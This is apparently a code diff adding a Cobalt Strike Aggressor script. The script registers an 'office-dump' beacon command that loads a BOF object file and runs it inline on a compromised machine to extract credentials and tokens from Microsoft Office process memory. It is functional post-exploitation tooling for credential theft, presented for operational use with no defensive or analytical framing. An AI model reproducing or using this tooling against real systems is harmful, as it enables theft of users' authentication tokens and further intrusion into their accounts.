@@ -1,0 +1,52 @@
+beacon_command_register(
+    "office-dump",
+    "Extract credentials from Microsoft Office process memory",
+    "Usage: office-dump <pid>\n\n" .
+    "Arguments:\n" .
+    "  pid  - Process ID of the Office application\n\n" .
+    "Examples:\n" .
+    "  office-dump 4532\n" .
+    "  office-dump 32556\n\n" .
+    "Tip: Use 'ps' command to find Office process PIDs"
+);
+
+alias office-dump {
+    local('$bid $pid $barch $bof_path $fh $data $args');
+
+    $bid = $1;
+
+    if (size(@_) < 2) {
+        berror($bid, "Usage: office-dump <pid>");
+        return;
+    }
+
+    $pid = $2;
+
+    if ($pid !ismatch '^[0-9]+$') {
+        berror($bid, "Error: PID must be a number");
+        return;
+    }
+
+    $pid = int($pid);
+    $barch = barch($bid);
+    $bof_path = script_resource("Bin/office-dump." . $barch . ".o");
+
+    $fh = openf($bof_path);
+    if ($fh is $null) {
+        berror($bid, "Error: Could not open BOF file (" . $bof_path . ")");
+        return;
+    }
+
+    $data = readb($fh, -1);
+    closef($fh);
+
+    if ($data is $null || strlen($data) == 0) {
+        berror($bid, "Error: BOF file is empty or unreadable");
+        return;
+    }
+
+    $args = bof_pack($bid, "i", $pid);
+
+    beacon_inline_execute($bid, $data, "go", $args);
+    blog($bid, "Tasked beacon to extract office tokens from process id: $pid");
+}
